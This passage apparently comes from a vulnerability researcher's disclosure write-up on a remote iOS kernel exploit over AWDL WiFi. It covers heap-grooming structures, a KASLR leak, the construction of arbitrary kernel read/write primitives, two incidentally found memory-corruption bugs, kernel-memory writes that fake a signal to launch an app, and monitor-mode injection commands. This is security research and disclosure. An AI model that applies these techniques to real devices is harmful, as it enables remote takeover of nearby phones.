Why did I choose to read from offset +0x1648? Because that's also the offset of the sync_tree_macs buffer in the IO80211AWDLPeer where we can place arbitrary data. Each of those middle target peers is created like this:
struct peer_fake_steering_blob {
uint32_t msg_id;
uint32_t msg_len;
uint32_t magic; // 0x43434343 == peer
struct ether_addr mac; // the MAC of this peer
uint8_t pad[32];
} __attribute__((packed));
struct peer_fake_steering_blob fake_steerer = {0};
fake_steerer.msg_id = 6;
fake_steerer.msg_len = 0x320;
fake_steerer.magic = 0x43434343;
fake_steerer.mac = target_groom_peer;
WIFI(dst, target_groom_peer),
SYNC_TREE((struct ether_addr*)&fake_steerer,
sizeof(struct peer_fake_steering_blob)
The magic value 0x43434343 lets us determine whether our read has found a service_response buffer or a peer. Following that we put the spoofed MAC address of this peer. This allows us to determine which peer has the address we guessed. If we do manage to find a peer allocation we can then examine the remaining bytes of disclosed memory; there's a high probability that following this peer is another peer, and we've disclosed the first few dozen bytes of it. Here's a hexdump of a successfully located peer:
An annotated hexdump of the disclosed memory when two neighbouring IO80211AWDLPeer objects are found. Here you can see the runtime values of the fields in the peer header, including the PAC'ed vtable pointer
We can see here that we have managed to find two peers next to each other. We'll call these lower_peer and upper_peer. By placing each sprayed peer's MAC address in the sync_tree_macs array we're able to determine both lower_peer and upper_peer's MAC address. Since we know which guessed virtual address we chose we also know the virtual addresses of lower_peer and upper_peer, and from the PAC'ed vtable pointer we can compute the KASLR slide.
From now on we can easily and repeatedly corrupt the fields seen above by sending a large sync tree TLV containing a modified version of this dumped memory:
Using the disclosed memory we can safely manipulate the lower fields in upper_peer using the SyncTree buffer overflow
A mild panic?
Accidental 0day 1 of 2
During my experiments to get the BSS Steering state machine working and into the desired state where it would send UMIs, I noticed that the target device would sometimes kernel panic, even when I was very sure that I hadn't triggered the heap overflow vulnerability. As it turns out, I was accidentally triggering another zero-day vulnerability...
This was slightly concerning as it had now been months since I had reported the first AWDL-based vulnerability to Apple and a fix for that had already shipped. One my early hopes for Project Zero would be that we could have a "research amplification" effect: we would invest significant effort in publicly less-understood areas of vulnerability research and exploitation and present our results to the affected vendors who would then use their significantly greater resources to continue this research. Vendors have resources such as source code and design documents which should make it vastly easier to audit many of these attack surfaces - we would be keen to assist in this second phase as well.
A more pragmatic view of reality is that whilst the security and product teams do want to continue our research, and do have many more resources, the one important resource they lack is time. Justifying the benefits of fixing a vulnerability which will become public in 90 days is easy but extracting the maximum value from that external report by investing a significant amount of time is much harder to justify; these teams already have other goals and targets for the quarter. Time is the key resource which makes Project Zero successful; we don't have to do vulnerability triage, or design review, or fix bugs or any of the other things typical product security teams have to do.
I mention this because I stumbled over (and reported to Apple) not one but two more remotely-exploitable radio-proximity 0-day vulnerabilities during this research, the first of which appears to have been at least on some level known about:
[Mark Dowd is the co-founder of Azimuth]( an Australian "market-leading information security business".
It's well known to all vulnerability researchers that the easiest way to find a new vulnerability is to look very closely at the code near a vulnerability which was recently fixed. They are rarely isolated incidents and usually indicate a lack of testing or understanding across an entire area.
I'm emphasising this point because Mark Dowd's tweet above is claiming knowledge of a variant that wasn't so difficult to find. One that was so easy to find, in fact, that it falls out by accident if you make the slightest mistake when doing BSS Steering.
We saw the function IO80211AWDLPeer::populateBssSteeringMsgBlob earlier; it's responsible for allocating and populating the steering_msg_blob buffer which will end up as the contents of the 0x1d TLV sent in a AWDL BSS Steering UMI.
At the beginning of the function they check whether this peer already has steering_msg_blob:
if (this->steering_msg_blob && this->steering_msg_blob_size) {
kfree(this->steering_msg_blob, this->steering_msg_blob_size);
this->steering_msg_blob = 0LL;
If it does have one it gets free'd and NULL-ed out.
They then compute the size of the new steering_msg_blob, allocate it and fill it in:
steering_blob_size = *(_DWORD *)(msg + 0x3C) + 0x4F;
this->steering_msg_blob = kalloc(steering_blob_size);
this->steering_blob_size = steering_blob_size;
All ok.
Right at the end of the function they then try to add the peer to the "UMI chain" - this is this other linked list of peers with pending UMIs which we saw earlier:
err = 0;
if (this->addPeerToUmiChain()) {
if ( peer_manager
&& peer_manager->isSafeToSendUmiNow(
this->chanseq_channels[peer_manager->current_chanseq_step + 1],0)) {
err = 0;
} else {
kfree(this->steering_msg_blob, this->steering_msg_blob_size);
this->UMI_feature_mask = 0;
err = 0xE00002BC;
return err;
If the peer gets successfully added to the UMI chain, they test whether they could send the UMI right now (if both this device and the target are in AW's on the same channel). If so, they force the UMI timer to expire, which triggers the code we saw earlier to read the steering_msg_blob, build the UMI template and send it.
However, if addPeerToUmiChain fails then the steering_msg_blob is freed. But unlike the earlier kfree, this time they don't NULL out the pointer before returning. The vulnerability here is that that field is expected to be the owner of that allocation; so if we can somehow come back into populateBssSteeringMsgBlob again this same value will be freed a second time.
There's an even easier way to trigger a double-kfree however: by doing nothing.
After a period of inactivity the IO80211AWDLPeer object will be destructed and free'd. As part of that the IO80211AWDLPeer::freeResources will be called, which does this:
steering_msg_blob = this->steering_msg_blob;
if ( steering_msg_blob ) {
kfree(steering_msg_blob, this->steering_msg_blob_size);
this->steering_msg_blob = 0LL;
this->steering_msg_blob_size = 0;
This will see a value for steering_msg_blob which has already been freed and free it a second time. If an attacker were able to reallocate the buffer in between the two frees they could get that controlled object freed, leading to a use-after-free.
It actually took some reversing effort to work out how to make addPeerToUmiChainnot fail. The trick is that the peer needs to have sent a datapath TLV with the 0x800 flag set in the first dword, and that's why we set that flag.
This vulnerability also opens a different possibility for the initial memory disclosure. By steering multiple peers it's possible to use this to construct a primitive where the target device will attempt to send a UMI containing memory from a steering_msg_blob which has been freed. With some heap grooming this could allow the disclosure of both a stale allocation as well as out-of-bounds data without needing to guess pointers. In the end I chose to stay with the low zone_map entropy technique as I also wanted to try to land this remote kernel exploit using only a single vulnerability.
We'll get back to the exploit now and take a look at accidental 0day 2 of 2 later on...
The path to a write
We've seen that the peer objects seem to be accessed frequently in the background, not just when we're sending frames. This is important to bear in mind as we search for our next corruption target.
One option could be to use the arbitrary free primitive. Maybe we could free a peer object but this would be tricky as the memory allocator would write metadata over the vtable pointer and the peer might be used in the background before we got a chance to ensure it was safe.
Another possibility could be to cause a type confusion. It's possible that you could find a useful gadget with such a primitive but I figured I'd keep looking for something else.
At this point I started going through more AWDL code looking for all indirect writes I could find. Being able to write even an uncontrolled value to an arbitrary address is usually a good stepping-stone to a full arbitrary memory write primitive.
There's one indirect write which stood out as particularly interesting; right at the start of IO80211AWDLPeer::actionFrameReport:
peer_manager = this->peer_manager;
frame_len = mbuf_len(frame_mbuf);
peer_manager->total_bytes_received += frame_len;
per_second_timestamp = this->per_second_timestamp;
absolute_time_now = mach_absolute_time();
frames_in_last_second = this->n_frames_in_last_second;
if ( ((absolute_time_now - per_second_timestamp) / 1000000)
if ( frames_in_last_second >= 0x21 )
(IO80211Peer *)this,
"%s[%d] : Received %d Action Frames from peer %02X:%02X:%02X:%02X:%02X:%02X in 1 second. Bad Peer\n",
this->per_second_timestamp = mach_absolute_time();
this->n_frames_in_last_second = 1;
else if ( frames_in_last_second >= 0x21 )
*(_DWORD *)(a2 + 20) = 1;
return 0;
... // continue on to parse the frame
Those first three lines of the decompiler output are exactly the kind of indirect write we're looking for:
peer_manager = this->peer_manager;
frame_len = mbuf_len(frame_mbuf);
peer_manager->total_bytes_received += frame_len;
The peer_manager field is at offset +0x28 in the peer object, easily corruptible with the linear overflow. The total_bytes_received field is a u32 at offset +0x7c80 in the peer manager, and frame_len is the length of the WiFi frame we send so we can set this to an arbitrary value, albeit at least 0x69 (the minimum AWDL frame size) and less than 1200 (potentially larger with fragmentation but it wouldn't help much). That arbitrary value would then get added to the u32 at offset +0x7c80 from the peer_manager pointer. This would be enough to do a byte-by-byte write of arbitrary memory, presuming you knew what was there before:
By corrupting upper_peer's peer_manager pointer then spoofing a frame from upper_peer we can cause an indirect write through the corrupted peer_manager pointer. The peer_manager has a dword field at offset +0x7c80 which counts the total number of bytes received from all peers; actionFrameReport will add the length of the frame spoofed from upper_peer to the dword at the corrupted peer_manager pointer + 0x7c80 giving us an arbitrary add primitive
We do have a limited read primitive already, probably enough to bootstrap ourselves to a full arbitrary read and therefore full arbitrary write. We can indeed reach this code with a corrupted peer_manager pointer and get an arbitrary add primitive. There's just one tiny problem, which will take many more weeks to solve: We'll panic immediately after the write.
Getting the timing right
Although the IO80211AWDLPeer's peer_manager field doesn't appear to be used often in the background (unlike the vtable), the peer_manager field will be used later on in the actionFrameReport method, and since we're trying to write to arbitrary addresses it will almost certainly cause a panic.
Looking at the code, there is only one safe path out of actionFrameReport:
if ( ((absolute_time_now - per_second_timestamp) / 1000000)
if (frames_in_last_second >= 0x21)
(IO80211Peer *)this,
"%s[%d] : Received %d Action Frames from peer %02X:%02X:%02X:%02X:%02X:%02X in 1 second. Bad Peer\n",
this->per_second_timestamp = mach_absolute_time();
this->n_frames_in_last_second = 1;
else if ( frames_in_last_second >= 0x21 )
*(_DWORD *)(a2 + 20) = 1;
return 0;
We have to reach that return 0 statement, which means we need the first if clause to be false, and the second one to be true.
The first statement checks whether more than 1024 ms have elapsed since the per_second_timestamp was updated.
The second statement checks whether more than 32 frames have been received since the per_second_timestamp was last updated.
So to reach the return 0 and avoid the panics due to an invalid peer_manager pointer we'd need to ensure that 32 frames have been received from the same spoofed peer within a 1024ms period.
You are hopefully starting to see why the ACK sniffing model vs the timing model is advantageous now; if the target had only received 31 frames then attempting the arbitrary add would cause a kernel panic.
Recall that at this point however I'm using a 2.4Ghz only WiFi adaptor for injection and monitoring and the only data rate I can get to work is 1Mbps. Actually getting 33 frames onto the air inside 1024ms, especially as only a fraction of that time will be AWDL Availability Windows, is probably impossible.
Furthermore, as I suddenly need far more accuracy in terms of knowing whether frames were received or not, I start to notice how unreliable my monitor device is. It appears to be frequently dropping frames, with an error rate seemingly positively-correlated with how long the adapter has been plugged in. After a while my testing model includes having to unplug the injection and monitoring adaptors after each test to let them cool down. This hopefully gives a taste of how frustrating many parts of this exploit development processes were. Without a stable and fast testing setup prototyping ideas is painfully slow, and figuring out whether an idea didn't work is made harder because you never know if your idea didn't work, or if it was yet another hardware failure.
Changing the clocks
It's probably impossible to make the timing checks pass using intended behaviour with the current setup. But we still have a few tricks up our sleeve. We do have a memory corruption vulnerability after all.
Looking at the two relevant fields per_second_timestamp and n_frames_in_last_second we notice that they're at the following offsets:
So the timestamp (which is absolute, not relative) and the frame count are just after the sync tree buffer which we can overflow out of meaning we can reliably corrupt them and provide a fake timestamp and count.
Arbitrary add idea 1: clock synchronization
My first idea was to try to determine the delta between the target device's absolute clock and the raspberry pi running the exploit. Then safely triggering an arbitrary add would be a three step process:
1) Compute a valid per_second_timestamp value at a point just in the future and do a short overflow within upper_peer to give it that arbitrary timestamp and a high n_frames_in_last_second value.
2) Do a long overflow from lower_peer to corrupt upper_peer's peer_manager pointer to point 0x7c80 bytes below the arbitrary add target.
3) Spoof a frame from upper_peer where the length corresponds to the size of the arbitrary add. As long as the timestamp we wrote in step 1 is less than 1024 ms earlier than the target device's current current clock, and the n_frames_in_last_second is still large, we'll hit the early error return path.
To pull this off we'll need to synchronize our clocks. AWDL itself is built on accurate timing and there are timing values in each AWDL frame. But they don't really help us that much because those are relative timestamps whereas we need absolute timestamps.
Luckily we already have a restricted read primitive, and in fact we've already accidentally used it to leak a timestamp:
The same annotated hexdump from the initial read primitive when it found two neighbouring peers. At offset +0x43 in the dump we can see the per_second_timestamp value. We'd now like to leak one of these which we force to be set at an exact moment in time
We can use the initial limited arbitrary read primitive again under more controlled conditions to try to determine the clock delta like this:
1) Wait 1024 ms.
2) Spoof a frame from lower_peer, which will cause it to get a fresh per_second_timestamp.
3) When we receive an ACK, record the current timestamp on the raspberry pi.
4) Use the BSS Steering read to read lower_peer's timestamp.
5) Convert the two timestamps to the same units and compute the delta.
Now we can perform the arbitrary write as described above by using the SyncTree overflow inside upper_peer to give it a fake and valid per_second_timestamp and n_frames_in_last_second value. This works, and we can add an arbitrary byte to an arbitrary address!
Unfortunately it's not very reliable. There are too many things to go wrong here, and for a painful couple of weeks everything went wrong. Firstly, as previously discussed, the injection and monitoring hardware is just too unreliable. If we miss ACKs we end up getting the clock delta wrong, and if the clock delta is too wrong we'll panic the target. Also, we're still sending frames very slowly, and the slower this all happens the lower the probability that our fake timestamp stays valid by the time it's used. We need an approach which is going to work far more reliably.
More timing tricks
Having to synchronize the clocks is fragile. Looking more closely at the code, I realized there was another way to reach the error bail out path without manually syncing.
If we wait 1024ms then spoof a frame, the peer structure will get a fresh timestamp which will pass the timestamp check for the next 1024ms.
We can't do that and then overflow into the n_frames_in_last_second field, because that field is after the per_second_timestamp so we'd corrupt it. But there is actually a way to corrupt the n_frames_in_last_second field without touching the timestamp:
1) Wait 1024ms then spoof a valid frame from upper_peer, giving its IO80211AWDLPeer object a valid per_second_timestamp.
2) Overflow from lower_peer into upper_peer, setting upper_peer's peer_manager pointer to 0x7c80 bytes before upper_peer's frames_in_last_second counter.
3) Spoof a valid frame from upper_peer.
Let's look more closely at exactly what will happen now:
It's now the case that this->peer_manager points 0x7c80 before peer->n_frames_in_last_second when IO80211AWDLPeer::actionFrameReport gets called on upper_peer:
peer_manager = this->peer_manager;
frame_len = mbuf_len(frame_mbuf);
Because we've corrupted upper_peer's peer_manager pointer, peer_manager->total_bytes_received overlaps with upper_peer->n_frames_in_last_second, meaning this add will add the frame length to upper_peer->n_frames_in_last_second! The important part is that this write happens before n_frames_in_last_second is checked!
peer_manager->total_bytes_received += frame_len;
per_second_timestamp = this->per_second_timestamp;
absolute_time_now = mach_absolute_time();
frames_in_last_second = this->n_frames_in_last_second;
And if we're fast enough we'll still pass this check, because we have a real timestamp:
if ( ((absolute_time_now - per_second_timestamp) / 1000000)
and now we'll also pass this check and return:
else if ( frames_in_last_second >= 0x21 )
*(_DWORD *)(a2 + 20) = 1;
return 0;
We've now got a timestamp still valid for some portion of 1024ms and n_frames_in_last_second is very large, without having to send that many frames within the 1024ms window or having to manually synchronize the clocks.
The fourth step is then to overflow again from lower_peer to upper_peer, this time pointing peer_manager to 0x7c80 below the desired add target. Finally, spoof a frame from upper_peer, padded to the correct size for the desired add value.
Another timing trick
The final timing trick for now was to realize we could skip the initial 1024ms wait by first overflowing within upper_peer to set its timestamp to 0. Then the next valid frame spoofed from upper_peer would be sure to set a valid per_second_timestamp usable for the next 1024 ms. In this way we can use the arbitrary write quite quickly, and start building our next primitive. Except...
I'm still panicking...
Earlier I accidentally discovered another exploitable zero day. Fortunately it was fairly easy to avoid triggering it, but my exploit continued to panic the target device in a multitude of ways. Of course, as before, I'd sort of expect this and indeed I worked out a few ways in which I was potentially causing panics.
One was that when I was overwriting the peer_manager pointer I was also overwriting the flink and blink pointers of the peer in the linked list of peers. If peers had been added or removed from the list since I had taken the copy of those pointers I could now be corrupting the list, potentially adding back stale pointers or altering the order. This was bound to cause problems so I added a workaround: I would ensure that no spoofed peers ever got freed. This is simple to implement; just ensure every peer spoofs a frame around every 20 seconds or so and you'll be fine.
But my test device was still panicking, so I decided to really dig into some of the panics and work out exactly what seems to be happening. Am I accidentally triggering yet another zero-day?
More accidental zero-day
After a day or so of analysis and reversing I realize that yes, this is in fact another exploitable zero-day in AWDL. This is the third, also reachable in the default configuration of iOS.
This vulnerability took significantly more effort to understand than the double free. The condition is more subtle and boils down to a failure to clear a flag. With no upfront knowledge of the names or purposes of these flags (and there are hundreds of flags in AWDL) it required a lot of painstaking reverse engineering to work out what's going on. Let's dive in.
resetAndRemovePeerInfo is a member method of the IO80211PeerBssSteeringManager. It's called when a peer is being destructed:
IO80211AWDLPeer *peer) {
struct BssSteeringCntx *cntx;
if (!peer) {
peer->added_to_fw_cache = 0;
struct BssSteeringCntx* cntx = this->steering_cntx;
if (cntx->peer_count) {
for (uint64_t i = 0; i < cntx->peer_count; i++) {
if (memcmp(&cntx->peer_macs[i], &peer->peer_mac, 6uLL) == 0) {
memset(&cntx->peer_macs[i], 0, 6uLL);
We can see a callsite here in IO80211AWDLPeerManager::removePeer:
if (peer->added_to_fw_cache) {
if (this->steering_manager) {
added_to_fw_cache is a name I have given to the flag field at +0x4b8 in IO80211AWDLPeer. We can see that if a peer with that flag set is destructed then the peer manager will call the steering_manager's resetAndRemovePeerInfo method shown above.
resetAndRemovePeerInfo clears that flag then iterates through the steering context object's array of currently-being-steered peer MAC addresses. If the peer being destructed's MAC address is found in there, then it's memset to 0.
The logic already looks a little odd; they decrement peer_count but don't shrink the size of the array by swapping the empty slot with the last valid entry, meaning it will only work correctly if the peers are destructed in the exact reverse order that they were added. Kinda weird, but probably not a security vulnerability.
The logic of this function means peer_count will be decremented each time it runs. But what would happen if this function were called more times than the initial value of peer_count? In the first extra invocation the memcmp loop wouldn't execute and peer_count would be decremented from 0 to 0xffffffff, but in the second extra invocation, the peer_count is non-zero, so it would enter the memcmp/memset loop. But the only loop termination condition is i >= peer_count, so this loop will try to run 4 billion times, certainly going off the end of the 8 entry peer_macs array:
struct __attribute__((packed)) BssSteeringCntx {
My reverse engineered version of the BSS Steering context object. I've managed to name most of the fields.
This is only a vulnerability if it's possible to call this function peer_count+2 times. (To decrement peer_count down to 0, then set it to -1, then re-enter with peer_count = -1.)
Whether or not resetAndRemovePeerInfo is called when a peer is destructed depends only on whether that peer has the added_to_fw_cache flag set; this gives us an inequality: the number of peer's with added_to_fw_cache set must be less than or equal to peer_count+1. Probably it's really meant to be the case that peer_count should be equal to the number of peers with that flag set. Is that the case?
No, it's not. After steering fails we restart the BSS Steering state machine by sending a new BSSSteering TLV with a steeringMsgID of 6 rather than 0; this means the steering state machine gets a BSS_STEERING_REMOTE_STEERING_TRIGGER event rather than the BSS_STEERING_RECEIVED_DIRECTED_STEERING_CMD which was used to start it. This resets the steering context object, filling the peer_macs array with whatever new peer macs we specify in the new DIRECTED_STEERING_CMD TLV. If we specify different peers to those already in the context's peer_macs array, then those old entries' corresponding IO80211AWDLPeer objects don't have their added_to_fw_cache field cleared, but the new peers do get that flag set.
This means that the number of peers with the flags set becomes greater than context->peer_count, so as the peers eventually get destructed peer_count goes down to zero, underflows then causes memory corruption.
I was hitting this condition each time I restarted steering, though it would take some time for the device to actually kernel panic because the steered peers needed to timeout and get destructed.
Root causing this second bonus remotely-triggerable iOS kernel memory corruption was much harder than the first bonus double-free; the explanation given above took a few days work. It was necessary though as I had to work around both of these vulnerabilities to ensure I didn't accidentally trigger them, which in total added a significant amount of extra work.
The work-around in this case was to ensure that I only ever restarted steering the same peers; with that change we no longer hit the peer_count underflow and only corrupt the memory we're trying to corrupt! This issue was fixed in [iOS 13.6 as CVE-2020-9906](
The target is no longer randomly kernel panicking even when we don't trigger the intended Sync Tree heap overflow, so let's get back to the exploit.
Add to read
We have an arbitrary add primitive but it's not quite an arbitrary write yet. For that, we need to know the original values so we can compute the correct per-byte frame sizes to overflow each byte to write a truly arbitrary value.
Probably we'll have to use the arbitrary add to corrupt something in a peer or the peer manager such that we can get it to follow an arbitrary pointer when building an MI or PSF frame which will be sent over the air.
I went back to IDA and spent a long time looking through code to search for such a primitive, and found one in the construction of the Service Request Descriptor TLVs in MI frames:
(char *buffer, u32 total_size ...
req_desc = this->req_desc;
if ( req_desc ){
desc_len = req_desc->desc_len; // length
desc_ptr = req_desc->desc_ptr;
tlv_len = desc_len+4;
if (desc_len && desc_ptr && tlv_len < remaining) {
buffer[offset] = 16; // type
*(u16*)&buffer[offset+1] = desc_len + 1; // len
buffer[current_buffer_offset+3] = 3;
total_size - offset - 4);
This is reading an IO80211ServiceRequestDescriptor object pointer from the peer manager from which it reads another pointer and a length. If there's space in the MI frame for that length of buffer then it calls the RequestDescriptor's copyDataOnly method, which simply copies from the RequestDescriptor into the MI frame template. It's only reading these two pointer and length fields which are at offset +0x40 and +0x54 in the request descriptor, so by pointing the IO80211AWDLPeerManager's req_desc pointer to data we control we can cause the next MI template which is generated to contain data read from an arbitrary address, this time with no restrictions on the data being read.
We can use the limited read primitive we currently have to read the existing value of the req_desc pointer, we just need to find somewhere below it in the peer_manager object where we know there will always be a fixed, small dword we can use as the length value needed for the read. Indeed, a few bytes below this there is such a value.
The first trick is in choosing somewhere to point the req_desc pointer to. We want to choose somewhere where we can easily update the read target without having to trigger the memory corruption. From reading the TLV parsing code I knew there were some TLVs which have very little processing. A good example, and the one I chose to use, is the NSync TLV. The only processing is to check that the total TLV length including the header is less than or equal to 0x40. That entire TLV is then memcpy'ed into a 0x40 byte buffer in the peer object at offset +0x4c4:
memcpy(this->nsync_tlv_buf, tlv_ptr, tlv_total_len);
We can use the arbitrary write to point the peer_manager's req_desc pointer to just below the lower_peer's nsync_tlv buffer such that by spoofing NSync TLVs from lower_peer we can update the fake descriptor pointer and length values.
Some care needs to be taken when corrupting the req_desc pointer however as we can currently only do byte-by-byte writes and the req_desc pointer might be read while we are corrupting it. We therefore need a way to stop those reads.
IO80211AWDLPeerManager::updateBroadcastMI is on the critical path for the read, meaning that every time the MI frame is updated it must go through this function, which contains the following check:
if (this->frames_outstanding <= this->frames_limit) {
frames_limit is initialized to a fixed value of 3. If we first use the arbitrary add to make frames_outstanding very large, this check will fail and the MI template won't be updated, and the req_desc member won't be read. Then after we're done corrupting the req_desc pointer we can set this value back to its original value and the MI templates will be updated again and the arbitrary read will work.
An easy way to do this is to add 0x80 to the most-significant byte of frames_outstanding. The first time we do this it will make frames_outstanding very large. If it were 2 to begin with it would go from: 0x00000002 to 0x80000002.
Adding 0x80 to that MSB as second time would cause it to then overflow back 0, resetting the value to 2 again. This of course has the side effect of adding 1 to the next dword field in the peer_manager when it overflows, but fortunately this doesn't cause any problems.
Now by spoofing an NSync TLV from lower_peer and monitoring for a change in the contents of the 0x10 TLV sent by the target in MI frames we can read arbitrary kernel data from arbitrary addresses.
Speedy reader
We now have a truly arbitrary read, but unfortunately it can be a bit slow. Sometimes it takes a few seconds for the MI template to be updated. What we need is a way to force the MI template to be regenerated on demand.
Looking through the cross references to IO80211AWDLPeerManager::updateBroadcastMI I noticed that it seems the MI template gets regenerated each time the peer bloom filter gets updated in IO80211AWDLPeerManager::updatePeerListBloomFilter. As we saw much earlier in this post, and I had determined months before this point, the bloom filter code isn't used. But... we have an arbitrary add so we could just turn it on!
Indeed, by flipping the flag at +0x5950 in the IO80211AWDLPeerManager we can enable the peer bloom filter code.
With peer bloom filters enabled each time the target sees a new peer, it regenerates the MI template in order to ensure it's broadcasting an up-to-date bloom filter containing all the peers it knows about (or at least the first 256 in the peer list.) This means we can make our arbitrary read much much faster: we just need to send the correct NSync TLV containing our read target then spoof a new peer and wait for an updated MI. With this technique complete we can read arbitrary remote kernel memory over the air at a rate of many kilobytes per second.
Remote kernel memory read/write API
At this point we can build the typical abstraction layer used by a local privilege escalation exploit, except this time it's remote.
The main kernel memory read function is:
void* rkbuf(uint64_t kaddr, uint32_t len);
With some helpers to make the code simpler:
uint64_t rk64(uint64_t kaddr);
uint32_t rk32(uint64_t kaddr);
uint8_t rk8(uint64_t kaddr);
Similarly for writing kernel memory, we have the main write method:
void wk8(uint64_t kaddr, uint8_t desired_byte);
and some helpers:
void wkbuf(uint64_t kaddr, uint8_t* desired_value, uint32_t len);
void wk64(uint64_t kaddr, uint64_t desired_value);
void wk32(uint64_t kaddr, uint32_t desired_value);
From this point the exploit code starts to look a lot more like a regular local privilege escalation exploit and the remote aspect is almost completely abstracted away.
Popping calc with 15 bytes
This is already enough to pop calc. To do this we just need a way to inject a control flow edge into userspace somehow. A bit of grepping through the XNU code and I stumbled across the code handling BSD signal delivery which seemed promising.
Each process structure has an array of signal handlers; one per signal number.
struct sigacts {
user_addr_t ps_sigact[NSIG]; /* disposition of signals */
user_addr_t ps_trampact[NSIG]; /* disposition of signals */
The ps_trampact array contains userspace function pointers. When the kernel wants a userspace process to handle a signal it looks up the signal number in that array:
trampact = ps->ps_trampact[sig];
then sets the userspace thread's pc value to that:
(user64_addr_t)&((struct user_sigframe64*)sp)->sinfo,
Where sendsig_set_thread_state64 looks like this:
static kern_return_t
sendsig_set_thread_state64(arm_thread_state64_t *regs,
user64_addr_t catcher,
int infostyle,
int sig,
user64_addr_t p_sinfo,
user64_addr_t p_uctx,
user64_addr_t token,
user64_addr_t trampact,
user64_addr_t sp,
thread_t th_act) {
regs->x[0] = catcher;
regs->x[1] = infostyle;
regs->x[2] = sig;
regs->x[3] = p_sinfo;
regs->x[4] = p_uctx;
regs->x[5] = token;
regs->pc = trampact;
regs->cpsr = PSR64_USER64_DEFAULT;
regs->sp = sp;
return thread_setstatus(th_act,
(void *)regs,
The catcher value in X0 is also completely controlled, read from the ps_sigact array.
Note that the kernel APIs for setting userspace register values don't require userspace pointer authentication codes.
We can set X0 to the constant CFString "com.apple.calculator" already present in the dyld_shared_cache. On 13.3 on the 11 Pro this is at 0x1BF452778 in an unslid shared cache.
We set PC to this gadget in CommunicationSetupUI.framework:
MOV W1, BL _SBSLaunchApplicationWithIdentifier
This clears W1 then calls SBSLaunchApplicationWithIdentifier, a Springboard Services Framework private API for launching apps.
The final piece of this puzzle is finding a process to inject the fake signal into. It needs to have the com.apple.springboard.launchapplications entitlement in order for Springboard to process the launch request. Using [Jonathan Levin's entitlement database]( it's easy to find the list of injection candidates.
We remotely traverse the linked list of running processes looking for a victim, set a fake signal handler then make a thread in that process believe it has to handle a signal by OR'ing in the correct signal number in the uthread's siglist bitmap of pending signals:
wk8(uthread+0x10c+3, 0x40); // uthread->siglist
and finally making the thread believe it needs to handle a BSD[AST](
wk8_no_retry(thread+0x2e8, 0x80); // thread->act |= AST_BSD
Now, when this thread gets scheduled and tries to handling pending ASTs, it will try to handle our fake signal and a calculator will appear:

Improving the bootstrap BSS steering read
We've popped calc, we're done! Or are we? It's kinda slow, and there's no real reason for it to be so slow. We managed to build quite a fast arbitrary read primitive so that's not the bottleneck. The major bottleneck at the moment is the initial BSS Steering-based read. It's taking 8 seconds per read because it needs the state machine to time out between each attempt.
As we saw, however, the BSS Steering TLV indicates that we should be able to steer up to 8 peers at the same time, meaning that we should be able to improve our read speed by at least 8x. In fact, if we can get away with 8 or fewer initial reads our read speed could be much faster than that.
However, when you try to steer 8 peers simultaneously, it doesn't quite work as expected:
When multiple peers are steered the UMIs flood the airwaves. In this example I was steering 8 peers but the frames are dominated by UMIs to the first peer. You can see a handful of UMIs to :06, and one to :02 amongst the dozens to :00.
Testing against MacOS we also see the following log message:
Peer 22:22:aa:22:00:00 DID NOT ack our UMI
When the target tries to steer 8 peers at the same time it starts flooding the airwaves with UMI frames directed at the target peers - so many in fact that it never actually manages to send the UMIs for all 8 steering targets before timing out.
We've already covered how to stall the initial sending of UMIs by controlling the channel sequence, but it looks like we're also going to have to ACK the UMI frames.
ACK a MAC?
As we saw earlier, ACKs in 80211.a and g are timing based. To ACK a frame you have to send the ACK in the short window following the transmission of the frame. We definitely can't do that using libpcap, the timing needs microsecond precision. We probably can't even do that with a custom kernel driver.
There is however an obscure WiFi adaptor monitor mode feature called "Active Monitor Mode", supported by very few chipsets.
Active monitor mode allows you to inject and monitor arbitrary frames as usual, except in active monitor mode (as opposed to regular monitor mode) the adaptor will still ACK frames if they're being sent to its MAC address.
The Mediatek MT76 chipset was the only one I could find with a USB adaptor that supports this feature. I bought a bunch of MT76-based adaptors and the only one where I could actually get this feature to work was the [ZyXEL NWD6605]( which uses an mt76x2u chipset.
The only issue was that I could only get Active Monitor Mode to actually work when running at 12 Mbps on a 5GHz channel but my current setup was using adaptors which were not capable of 5GHz injection.
Moving to 5GHz
I had tried right back at the beginning of the exploit development process to get 5GHz injection and monitoring to work; after trying for a week with lots of adaptors and building many, many branches of kernel drivers and fiddling with radiotap headers I had given up and decided to focus on getting something working on 2.4GHz with my old adaptors.
This time around I just bought all the adaptors I could find which looked like they might have even the remotest possibility of working and tried again.
One of the challenges is that OEMs won't consistently use the same chipset or revision of chipset in a device, which means getting hold of a particular chipset and revision can be a hit-and-miss process.
Here are all the adaptors which I used during this exploit to try to find support for the features I wanted:
All the WiFi adaptors tested during this exploit development process, from top left to bottom right: D-Link DWA-125, Netgear WG111-v2, Netgear A6210, ZyXEL NWD6605, ASUS USB-AC56, D-Link DWA-171, Vivanco 36665, tp-link Archer T1U, Microsoft Xbox wireless adaptor Model 1790, Edimax EW-7722UTn V2, FRITZ!WLAN AC430M, ASUS USB-AC68, tp-link AC1300
In the end I required two different adaptors to get the features I wanted:
Active monitor mode and frame injection: [ZyXEL NWD6605]( using [mt76x2u]( driver
Monitor mode (including management and ACK frames): Netgear A6210 using [rtl8812au]( driver
With this setup I was able to get frame injection, monitor mode sniffing of all frames including management and ACK frames as well as Active monitor mode to work at 12 Mbps on channel 44.
Working with Active Monitor Mode
You can enable the feature like this:
ip link set dev wlan1 down
iw dev wlan1 set type monitor
iw dev wlan1 set monitor active control otherbss
ip link set dev wlan1 up
iw dev wlan1 set channel 44
We can change the card's MAC address using the ip tool like this:
ip link set dev wlan1 down
ip link set wlan1 address 44:44:22:22:22:22
ip link set dev wlan1 up
Changing the MAC address like this takes at least a second and the interface has to be down. Since we're trying to make these reads as fast as possible I decided to take a look at how this mac address changing actually worked to see if I could speed it up...
Three ways to set a MAC: 1 - ioctl
The old way to set a network device MAC address is to use the SIOCSIFHWADDR ioctl:
struct ifreq ifr = {0};
uint8_t mac[6] = {0x22, 0x23, 0x24, 0x00, 0x00, 0x00};
memcpy(&ifr.ifr_hwaddr.sa_data[0], mac, 6);
int s = socket(AF_INET, SOCK_DGRAM, 0);
strcpy(ifr.ifr_name, "wlan1");
ifr.ifr_hwaddr.sa_family = ARPHRD_ETHER;
int ret = ioctl(s, SIOCSIFHWADDR, 𝔦);
printf("ioctl retval: %d\n", ret);
This interface is deprecated and doesn't work at all for this driver.
Three ways to set a MAC: 2 - netlink
